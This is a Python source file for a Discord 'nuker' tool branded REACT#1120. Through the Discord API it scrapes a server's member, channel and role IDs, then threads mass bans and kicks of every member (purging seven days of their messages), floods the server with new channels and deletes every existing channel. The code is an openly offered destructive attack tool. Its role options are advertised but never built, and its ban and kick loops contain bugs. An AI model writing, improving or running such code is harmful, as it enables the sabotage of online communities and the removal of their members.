import os , discord , threading , json , requests ,  asyncio , aiohttp , sys , platform , time
from discord.ext.commands.core import check
from pathlib import Path
from discord.utils import find, get
from discord.ext import commands
from colorama import Fore, Back, Style ,init

init()

#REACT # 1120
#work in progress

start = True
prefix = "command_prefix"

"""

Check if there is config.json in the directory if not it will make one for you and you should edit the bot_token and put your discord bot token instead.

"""

if Path("config.json").exists():
    with open('config.json') as setting:
        config = json.load(setting)
    token = config.get("bot_token")
else: 
    with open("config.json", "w") as setting:
        setting.writelines(
            [
                "{",
                    "\n"
                    "    "+'"bot_token": "_____________________________________"',
                    "\n",
                "}"
            ]
        )

intents = discord.Intents.all()
intents.members = True 
client = commands.Bot(command_prefix=prefix, case_insensitive=True ,intents=intents)

os.system("title REACT DISCORD NUKER BY REACT#1120")
def clearcmd():
    if platform.system() == ("Windows"):
        os.system("cls")
    
    else:
        os.system("clear")

def checkinternetconnection():
    respond = True
    try:
        requests.get('https://www.google.com', verify=True)
        respond = True
    except Exception:
        respond = False
    
    if respond == True:
        print(Fore.GREEN + "Internet connection is good" + Fore.RESET)

    if respond == False:
        print(Fore.RED + "Internet connection is bad" + Fore.RESET)

def check_login(token):
    checkinternetconnection()
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": token}).status_code == 200:
        print("You can only use bot token for this nuker please visit " + Fore.BLUE+ "https://discord.com/developers/applications/" +Fore.RESET)
        input()
        sys.exit()
    else:
        print(Fore.CYAN+"Bot token is valid"+ Fore.RESET)

def scrapemember(guild_id):
    guild = client.get_guild(guild_id)
    try:
        os.remove("Scraped/members.txt")

    except:
        pass

    membercount = 0
    with open('Scraped/members.txt', 'a') as f:
        for member in guild.members:
            f.write(str(member.id) + "\n")
            membercount += 1
        print(f"Scraped {membercount} Members")

def scrapechannel(guild_id):
    guild = client.get_guild(guild_id)
    try:
        os.remove("Scraped/channels.txt")

    except:
        pass

    channelcount = 0
    with open('Scraped/channels.txt', 'a') as f:
        for channel in guild.channels:
            f.write(str(channel.id) + "\n")
            channelcount += 1
        print(f"Scraped {channelcount} Channels")

def scraperole(guild_id):
    guild = client.get_guild(guild_id)
    try:
        os.remove("Scraped/roles.txt")

    except:
        pass

    rolecount = 0
    with open('Scraped/roles.txt', 'a') as f:
        for role in guild.roles:
            f.write(str(role.id) + "\n")
            rolecount += 1
        print(f"Scraped {rolecount} Roles")

def ban(guild, member):
    headers = {'Authorization': f'Bot {token}'}
    try:
        json = {
            'delete_message_days': '7',
            'reason': 'NUKE'
        }
        r = requests.put(f'https://discord.com/api/v8/guilds/{guild}/bans/{member}', headers=headers, json=json)
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            print(Fore.GREEN + f"Banned {member.strip()}\n" + Fore.RESET)
        else:
            print(Fore.RED + f"Failed to ban {member.strip()}\n" + Fore.RESET)
    except:
        pass

def kick(guild, member):
    headers = {'Authorization': f'Bot {token}'}
    try:
        json = {
            'delete_message_days': '7',
            'reason': 'NUKE'
        }
        r = requests.delete(f'https://discord.com/api/v8/guilds/{guild}/members/{member}', headers=headers, json=json)
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            print(Fore.GREEN + f"Kicked {member.strip()}\n" + Fore.RESET)
        else:
            print(Fore.RED + f"Failed to kick {member.strip()}\n" + Fore.RESET)
    except:
        pass

def createchannel(guild , channel_name):
    headers = {'Authorization': f'Bot {token}'}
    try:
        json = {
            'name': channel_name,
            'type': 0
        }
        r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            print(f"Created Channel {json['name']}")
        else:
            print(f"Couldn't Create Channel {json['name']}")
    except:
        pass

def deletechannel(guild , channel):
    headers = {'Authorization': f'Bot {token}'}
    try:
        r = requests.delete(f'https://discord.com/api/v8/channels/{channel}', headers=headers)
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            print(f"Deleted Channel {channel.strip()}\n")
        else:
            print(f"Couldn't Delete Channel {channel.strip()}\n")
    except:
        pass

async def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)

async def menu(start):
    if start != False:
        print("Loading...")
        clearcmd()
        await asyncio.sleep(0.5)
        await restart_program()
    else:
        pass
    clearcmd()
    clearcmd()
    logo = """                                                 
                                    _____  ______          _____ _______ 
                                   |  __ \|  ____|   /\   / ____|__   __|
                                   | |__) | |__     /  \ | |       | |   
                                   |  _  /|  __|   / /\ \| |       | |   
                                   | | \ \| |____ / ____ \ |____   | |   
                                   |_|  \_\______/_/    \_\_____|  |_|REACT#1120"""
                          
    print(Fore.CYAN +f"{logo}")
    print("")
    print(Fore.YELLOW +"                        ╔══════════════════════════════════════════════════════════╗"+ Fore.RESET)
    print(Fore.YELLOW +"                        ║	                                                   ║"+ Fore.RESET)
    print(Fore.YELLOW +"                        ║"+ Fore.CYAN+"                     1. Scrape info          "+Fore.YELLOW+"	           ║"+ Fore.RESET)
    print(Fore.YELLOW +"                        ║"+ Fore.CYAN+"                     2. Massban              "+Fore.YELLOW+"	           ║"+ Fore.RESET)
    print(Fore.YELLOW +"                        ║"+ Fore.CYAN+"                     3. Masskick             "+Fore.YELLOW+"	           ║"+ Fore.RESET)
    print(Fore.YELLOW +"                        ║"+ Fore.CYAN+"                     4. Create channels      "+Fore.YELLOW+"	           ║"+ Fore.RESET)
    print(Fore.YELLOW +"                        ║"+ Fore.CYAN+"                     5. Delete Channels      "+Fore.YELLOW+"	           ║"+ Fore.RESET)
    print(Fore.YELLOW +"                        ║"+ Fore.CYAN+"                     6. Create roles         "+Fore.YELLOW+"	           ║"+ Fore.RESET)
    print(Fore.YELLOW +"                        ║"+ Fore.CYAN+"                     7. Delete roles         "+Fore.YELLOW+"	           ║"+ Fore.RESET)
    print(Fore.YELLOW +"                        ║	                                                   ║"+ Fore.RESET)
    print(Fore.YELLOW +"                        ╚══════════════════════════════════════════════════════════╝")
    choice = input("ROOT@REACT>> ")   

    if choice == "1":
        guild_id = int(input("GUILD ID : "))
        memberscrape = threading.Thread(target=scrapemember(guild_id))
        channelscrape = threading.Thread(target=scrapechannel(guild_id))
        rolescrape = threading.Thread(target=scraperole(guild_id))
        memberscrape.start()
        channelscrape.start()
        rolescrape.start()
        time.sleep(0.5)
        await menu(True)

    elif choice == "2":
        guild_id = int(input("GUILD ID : "))
        scrapemember(guild_id)
        num = 0
        all_member = []
        with open("Scraped/members.txt", "r") as f:
            member_id = f.readlines()

            for id in member_id:
                all_member.append(id)
        
        member_1 = []
        member_2 = []
        member_3 = []
        member_4 = []
        member_5 = []

        total_member = len(all_member)
        member_each_array = round(total_member/5)

        for member in all_member:
            if len(member_1) != member_each_array:
                member_1.append(member)
            
            else:
                if len(member_2) != member_each_array:
                    member_2.append(member)
                
                else:
                    if len(member_3) != member_each_array:
                        member_3.append(member)
                    
                    else:
                        if len(member_4) != member_each_array:
                            member_4.append(member)
                        
                        else:
                            if len(member_5) != member_each_array:
                                member_5.append(member)
                            
                            else:
                                pass
        
        while True:
            try:
                threading.Thread(target=ban, args=(guild_id, member_1[num])).start()
                threading.Thread(target=ban, args=(guild_id, member_2[num])).start()
                threading.Thread(target=ban, args=(guild_id, member_3[num])).start()
                threading.Thread(target=ban, args=(guild_id, member_4[num])).start()
                threading.Thread(target=ban, args=(guild_id, member_4[num])).start()
                num = num + 1
            
            except IndexError:
                break
            except:
                pass

        time.sleep(0.5)
        await menu(True)

    elif choice == "3":
        guild_id = int(input("GUILD ID : "))
        scrapemember(guild_id)
        num = 0
        all_member = []
        with open("Scraped/members.txt", "r") as f:
            member_id = f.readlines()

            for id in member_id:
                all_member.append(id)
        
        member_1 = []
        member_2 = []
        member_3 = []
        member_4 = []
        member_5 = []

        total_member = len(all_member)
        member_each_array = round(total_member/5)

        for member in all_member:
            if len(member_1) != member_each_array:
                member_1.append(member)
            
            else:
                if len(member_2) != member_each_array:
                    member_2.append(member)
                
                else:
                    if len(member_3) != member_each_array:
                        member_3.append(member)
                    
                    else:
                        if len(member_4) != member_each_array:
                            member_4.append(member)
                        
                        else:
                            if len(member_5) != member_each_array:
                                member_5.append(member)
                            
                            else:
                                pass
        
        while True:
            try:
                threading.Thread(target=kick, args=(guild_id, member_1[num])).start()
                threading.Thread(target=kick, args=(guild_id, member_2[num])).start()
                threading.Thread(target=kick, args=(guild_id, member_3[num])).start()
                threading.Thread(target=kick, args=(guild_id, member_4[num])).start()
                threading.Thread(target=kick, args=(guild_id, member_4[num])).start()
                num = num + 1
            except IndexError:
                print("Index Error")
                break
            except:
                pass

        time.sleep(0.5)
        await menu(True)
    
    elif choice == "4":
        guild_id = int(input("GUILD ID : "))
        channel_name = input("CHANNEL NAME : ")
        amount = input("CHANNEL AMOUNT : ")
        for i in range(int(amount)):
            threading.Thread(target=createchannel, args=(guild_id, channel_name)).start()
        
        time.sleep(0.5)
        await menu(True)
    
    elif choice == "5":
        guild_id = int(input("GUILD ID : "))
        scrapechannel(guild_id)
        num = 0
        all_channel = []
        with open("Scraped/channels.txt", "r") as f:
            member_id = f.readlines()

            for id in member_id:
                all_channel.append(id)
        
        while True:
            try:
                threading.Thread(target=deletechannel, args=(guild_id, all_channel[num],)).start()
                num += 1
            except IndexError:
                break
            except:
                pass

        time.sleep(0.5)
        await menu(True)
    
    else:
        print(f"There is no option '{choice}' please press enter and try again")
        await menu(True)


@client.event
async def on_ready():
    await menu(False)
    
def main():
    check_login(token)
    try:
        client.run(token)

    except:
        print("Invalid bot token")


main()

